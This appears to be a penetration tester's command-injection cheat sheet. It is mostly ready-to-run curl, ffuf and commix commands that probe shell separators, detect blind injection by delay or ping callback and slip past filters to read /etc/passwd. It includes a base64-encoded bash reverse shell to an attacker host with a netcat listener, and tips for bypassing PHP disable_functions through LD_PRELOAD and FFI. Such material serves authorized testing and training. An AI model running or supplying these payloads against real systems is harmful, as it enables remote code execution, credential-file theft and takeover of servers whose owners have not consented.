# Command injection

## Probe each separator
A parameter that goes to a system tool, such as ping, nslookup or a converter:
for p in '%3bid' '%7cid' '%7c%7cid' '%26%26id' '%26id' '%0aid' '%60id%60' '%24(id)'; do echo "== $p"; curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=127.0.0.1$p" | grep 'uid='; done
- [ ] In a URL: ; is %3b, | is %7c, & is %26, a space is %20, a newline is %0a, and a bare & ends the parameter
- [ ] A POST form: the same payloads in --data '<Param>=127.0.0.1%3bid'
- [ ] Windows: whoami in place of id, and & or | as the separator

## Blind: a delay
The time with no payload first, then with one:
curl -sk -o /dev/null -w '%{time_total}\n' "<Scheme>://<WebHost>/THE-PAGE?<Param>=127.0.0.1"
curl -sk -o /dev/null -w '%{time_total}\n' "<Scheme>://<WebHost>/THE-PAGE?<Param>=127.0.0.1%3bsleep%205"
Windows has no sleep, so six pings, about five seconds:
curl -sk -o /dev/null -w '%{time_total}\n' "<Scheme>://<WebHost>/THE-PAGE?<Param>=127.0.0.1%7cping%20-n%206%20127.0.0.1"

## Blind: a callback
It also proves the target can reach me, which a reverse shell needs.
sudo tcpdump -i tun0 icmp
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=127.0.0.1%3bping%20-c%203%20<LHOST>"
Or the output written into the web root, then read:
curl -sk "<Scheme>://<WebHost>/THE-PAGE?<Param>=127.0.0.1%3bid%20%3e%20/var/www/html/out8f3k.txt"
curl -sk <Scheme>://<WebHost>/out8f3k.txt

## Fuzz
ffuf -c -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=FUZZ' -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -ac
ffuf -c -u <Scheme>://<WebHost>/THE-PAGE -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d '<Param>=FUZZ' -b 'THE-COOKIE' -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -ac
- [ ] A different size or a delay on a hit: tried again by hand

## Inside JSON
Close the quote around the value when the command wraps it in one:
{"<Param>": "127.0.0.1;id"}
{"<Param>": "127.0.0.1\";id;\""}
{"<Param>": "$(id)"}

## Past a filter
No spaces:
cat${IFS}/etc/passwd
{cat,/etc/passwd}
A blocked word:
c'a't /etc/passwd
/bin/c?t /etc/passwd
Blocked characters: the whole command as base64.
echo -n 'id' | base64 -w 0
;echo THE-BASE64|base64 -d|bash

## A reverse shell
rlwrap nc -lvnp <LPORT>
echo -n 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' | base64 -w 0
curl encodes it, + and = included:
curl -sk -G "<Scheme>://<WebHost>/THE-PAGE" --data-urlencode "<Param>=127.0.0.1;echo THE-BASE64|base64 -d|bash"
- [ ] The shell dies with the request: nohup in front, or bash -c '... &' around it
- [ ] Nothing connects: ports 80, 443 or 53 for <LPORT>
- [ ] Windows: a PowerShell one-liner encoded for -enc, from :Pb shells

## Automated
commix -u '<Scheme>://<WebHost>/THE-PAGE?<Param>=127.0.0.1' --batch
commix -r request.txt -p <Param> --batch

## After RCE: disable_functions bypass

Command injection into PHP often lands in a function on the disable list.

- [ ] Read the disable_functions list from phpinfo or php -i
- [ ] Try the commonly missed ones: popen, proc_open, pcntl_exec, mail, mb_send_mail, error_log
- [ ] LD_PRELOAD trick: drop a malicious shared object, then call mail() or error_log so the spawned sendmail loads it
- [ ] On PHP 7.4+, FFI::cdef calls system() directly when FFI is enabled
